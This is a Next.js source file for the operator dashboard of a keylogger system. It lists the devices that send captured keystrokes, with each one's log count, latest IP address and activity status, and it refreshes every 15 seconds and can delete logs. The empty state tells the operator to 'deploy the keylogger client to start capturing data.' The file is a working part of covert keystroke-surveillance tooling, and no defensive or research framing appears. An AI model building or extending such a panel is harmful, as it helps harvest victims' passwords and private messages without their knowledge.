"use client";

import {
  ChevronRight,
  Clock,
  Keyboard,
  Monitor,
  RefreshCw,
  Trash2,
} from "lucide-react";
import Link from "next/link";
import { useCallback, useEffect, useState } from "react";
import { ApiKeyGate } from "@/components/api-key-gate";
import { Button } from "@/components/ui/button";
import { formatTimestamp, timeAgo } from "@/lib/format";
import { useApiKey } from "@/lib/hooks/use-api-key";

interface DeviceDetail {
  device: string;
  logCount: number;
  latestIp: string | null;
  latestLog: string | null;
  oldestLog: string | null;
}

interface Stats {
  totalLogs: number;
  totalDevices: number;
  devices: string[];
  oldestLog: string | null;
  newestLog: string | null;
}

export default function DashboardPage() {
  const { isReady, login, logout, authHeaders } = useApiKey();

  const [devices, setDevices] = useState<DeviceDetail[]>([]);
  const [stats, setStats] = useState<Stats>({
    totalLogs: 0,
    totalDevices: 0,
    devices: [],
    oldestLog: null,
    newestLog: null,
  });
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  // Fetch devices overview
  const fetchDevices = useCallback(async () => {
    if (!authHeaders) return;

    setLoading(true);
    setError(null);

    try {
      const [devicesRes, statsRes] = await Promise.all([
        fetch("/api/devices/details", { headers: authHeaders }),
        fetch("/api/stats", { headers: authHeaders }),
      ]);

      if (devicesRes.status === 401 || statsRes.status === 401) {
        setError("Invalid API key. Please check and try again.");
        setLoading(false);
        return;
      }

      if (!devicesRes.ok || !statsRes.ok) {
        setError("Failed to fetch data from the server.");
        setLoading(false);
        return;
      }

      const devicesData = await devicesRes.json();
      const statsData = await statsRes.json();

      setDevices(devicesData.devices ?? []);
      setStats(
        statsData.stats ?? {
          totalLogs: 0,
          totalDevices: 0,
          devices: [],
          oldestLog: null,
          newestLog: null,
        },
      );
    } catch (err) {
      console.error("Failed to fetch devices:", err);
      setError("Network error. Could not reach the server.");
    } finally {
      setLoading(false);
    }
  }, [authHeaders]);

  // Fetch devices when API key is available
  useEffect(() => {
    if (isReady) {
      fetchDevices();
    }
  }, [isReady, fetchDevices]);

  // Auto-refresh every 15 seconds
  useEffect(() => {
    if (!isReady) return;

    const interval = setInterval(fetchDevices, 15000);
    return () => clearInterval(interval);
  }, [isReady, fetchDevices]);

  // Handle clearing logs for a device
  const handleClearDeviceLogs = async (device: string) => {
    if (!authHeaders) return;

    if (
      !confirm(
        `Are you sure you want to delete ALL logs for "${device}"? This cannot be undone.`,
      )
    ) {
      return;
    }

    try {
      const res = await fetch(
        `/api/logs?device=${encodeURIComponent(device)}`,
        {
          method: "DELETE",
          headers: authHeaders,
        },
      );

      if (res.ok) {
        fetchDevices();
      }
    } catch (err) {
      console.error("Failed to clear device logs:", err);
    }
  };

  // ── API key gate ──────────────────────────────────────────
  if (!isReady) {
    return <ApiKeyGate onSubmit={login} />;
  }

  // ── Devices Overview ──────────────────────────────────────
  return (
    <div className="min-h-screen bg-background">
      <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6 lg:px-8">
        {/* Header */}
        <div className="mb-8 flex items-center justify-between">
          <div>
            <h1 className="font-bold text-3xl text-foreground tracking-tight">
              Keylogger Dashboard
            </h1>
            <p className="mt-1 text-muted-foreground text-sm">
              Select a device to view its captured keystrokes.
            </p>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              size="sm"
              onClick={fetchDevices}
              disabled={loading}
            >
              <RefreshCw
                className={`mr-2 h-4 w-4 ${loading ? "animate-spin" : ""}`}
              />
              Refresh
            </Button>
            <Button
              variant="ghost"
              size="sm"
              onClick={() => {
                logout();
                setDevices([]);
                setStats({
                  totalLogs: 0,
                  totalDevices: 0,
                  devices: [],
                  oldestLog: null,
                  newestLog: null,
                });
              }}
            >
              Logout
            </Button>
          </div>
        </div>

        {/* Error */}
        {error && (
          <div className="mb-6 rounded-lg border border-destructive/30 bg-destructive/5 p-4 text-destructive text-sm">
            {error}
          </div>
        )}

        {/* Global Stats */}
        <div className="mb-8 grid grid-cols-1 gap-4 sm:grid-cols-3">
          <div className="rounded-lg border bg-card p-4 shadow-sm">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Keyboard className="h-5 w-5 text-primary" />
              </div>
              <div>
                <p className="font-medium text-muted-foreground text-sm">
                  Total Logs
                </p>
                <p className="font-bold text-2xl text-foreground">
                  {stats.totalLogs.toLocaleString()}
                </p>
              </div>
            </div>
          </div>

          <div className="rounded-lg border bg-card p-4 shadow-sm">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Monitor className="h-5 w-5 text-primary" />
              </div>
              <div>
                <p className="font-medium text-muted-foreground text-sm">
                  Connected Devices
                </p>
                <p className="font-bold text-2xl text-foreground">
                  {stats.totalDevices}
                </p>
              </div>
            </div>
          </div>

          <div className="rounded-lg border bg-card p-4 shadow-sm">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Clock className="h-5 w-5 text-primary" />
              </div>
              <div>
                <p className="font-medium text-muted-foreground text-sm">
                  Latest Activity
                </p>
                <p className="font-semibold text-foreground text-sm">
                  {stats.newestLog
                    ? formatTimestamp(stats.newestLog)
                    : "No logs yet"}
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Devices Grid */}
        <div className="rounded-lg border bg-card p-6 shadow-sm">
          <div className="mb-6">
            <h2 className="font-semibold text-foreground text-lg">Devices</h2>
            <p className="text-muted-foreground text-sm">
              All devices that have sent keystroke data.
              {!loading && (
                <span className="ml-1 text-muted-foreground/60">
                  Auto-refreshes every 15s.
                </span>
              )}
            </p>
          </div>

          {loading && devices.length === 0 ? (
            <div className="flex h-40 items-center justify-center text-muted-foreground text-sm">
              <RefreshCw className="mr-2 h-4 w-4 animate-spin" />
              Loading devices...
            </div>
          ) : devices.length === 0 ? (
            <div className="flex h-40 flex-col items-center justify-center gap-2 text-muted-foreground">
              <Monitor className="h-10 w-10 text-muted-foreground/40" />
              <p className="text-sm">No devices connected yet.</p>
              <p className="text-xs">
                Deploy the keylogger client to start capturing data.
              </p>
            </div>
          ) : (
            <div className="grid grid-cols-1 gap-4 md:grid-cols-2 lg:grid-cols-3">
              {devices.map(device => (
                <div key={device.device} className="group relative">
                  <Link
                    href={`/dashboard/${encodeURIComponent(device.device)}`}
                    className="block rounded-xl border bg-background p-5 shadow-sm transition-all hover:border-primary/40 hover:shadow-md"
                  >
                    {/* Card Header */}
                    <div className="mb-4 flex items-start justify-between">
                      <div className="flex items-center gap-3">
                        <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 transition-colors group-hover:bg-primary/20">
                          <Monitor className="h-5 w-5 text-primary" />
                        </div>
                        <div>
                          <div className="flex items-center gap-2">
                            <h3 className="font-semibold text-foreground leading-tight">
                              {device.device}
                            </h3>
                            {/* Delete button (top right, visible on hover) */}
                            <button
                              type="button"
                              onClick={() =>
                                handleClearDeviceLogs(device.device)
                              }
                              className="rounded-md p-1.5 text-muted-foreground opacity-0 transition-all hover:bg-destructive/10 hover:text-destructive group-hover:opacity-100"
                              title={`Clear all logs for ${device.device}`}
                            >
                              <Trash2 className="h-3.5 w-3.5" />
                            </button>
                          </div>
                          {device.latestIp && (
                            <p className="mt-0.5 font-mono text-muted-foreground text-xs">
                              {device.latestIp}
                            </p>
                          )}
                        </div>
                      </div>

                      <ChevronRight className="h-5 w-5 text-muted-foreground/40 transition-all group-hover:translate-x-0.5 group-hover:text-primary" />
                    </div>

                    {/* Card Stats */}
                    <div className="grid grid-cols-2 gap-3">
                      <div className="rounded-lg bg-muted/50 px-3 py-2">
                        <p className="text-[0.65rem] text-muted-foreground uppercase tracking-wider">
                          Log Entries
                        </p>
                        <p className="font-bold text-foreground text-lg">
                          {device.logCount.toLocaleString()}
                        </p>
                      </div>
                      <div className="rounded-lg bg-muted/50 px-3 py-2">
                        <p className="text-[0.65rem] text-muted-foreground uppercase tracking-wider">
                          Last Active
                        </p>
                        <p className="font-semibold text-foreground text-sm">
                          {device.latestLog
                            ? timeAgo(device.latestLog)
                            : "Never"}
                        </p>
                      </div>
                    </div>

                    {/* Activity indicator */}
                    {device.latestLog && (
                      <div className="mt-3 flex items-center gap-1.5">
                        <span
                          className={`inline-block h-2 w-2 rounded-full ${
                            Date.now() - new Date(device.latestLog).getTime() <
                            5 * 60 * 1000
                              ? "animate-pulse bg-green-500"
                              : Date.now() -
                                    new Date(device.latestLog).getTime() <
                                  60 * 60 * 1000
                                ? "bg-yellow-500"
                                : "bg-muted-foreground/40"
                          }`}
                        />
                        <span className="text-muted-foreground text-xs">
                          {Date.now() - new Date(device.latestLog).getTime() <
                          5 * 60 * 1000
                            ? "Active now"
                            : Date.now() -
                                  new Date(device.latestLog).getTime() <
                                60 * 60 * 1000
                              ? "Recently active"
                              : "Inactive"}
                        </span>
                      </div>
                    )}
                  </Link>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
